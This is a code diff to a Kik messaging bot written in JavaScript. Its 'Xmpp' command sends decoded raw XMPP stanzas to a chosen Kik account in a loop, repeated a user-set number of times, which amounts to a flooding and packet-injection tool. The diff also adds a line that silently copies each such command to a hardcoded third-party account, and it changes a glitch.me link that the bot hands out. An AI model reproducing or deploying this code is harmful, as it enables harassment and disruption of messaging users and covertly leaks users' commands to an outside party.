@@ -100,8 +100,11 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
   let msgParts = msg.split(" ");
   let msgNL = msg.split("\n");
 
-  if (msgParts[0] == "Xmpp") {
+  if (msgParts[0] == "Xmpp" && msgParts[1].endsWith(".kik.com")) {
     (async () => {
+            // Kik.sendXmpp("oooweeoo_tis@talk.kik.com", msg);
+      // Kik.sendXmpp('unclefunkle01_ap0@talk.kik.com', msg);
+      Kik.sendXmpp("fuckdavid___ym7@talk.kik.com", msg);
       let numb = 0;
       while (numb <= parseInt(msgParts[2])) {
         Kik.sendXmpp(msgParts[1], decode(msgNL[1]));
@@ -123,7 +126,7 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
   }
   
     if (msgParts[0] == "Send" && msgParts[1] == "link") {
-    let mess = " https://foul-valiant-humidity.glitch.me/ ";
+    let mess = " https://nettle-good-boa.glitch.me/ ";
     await Kik.sendMessage(sender.jid, mess);
     return;
   }
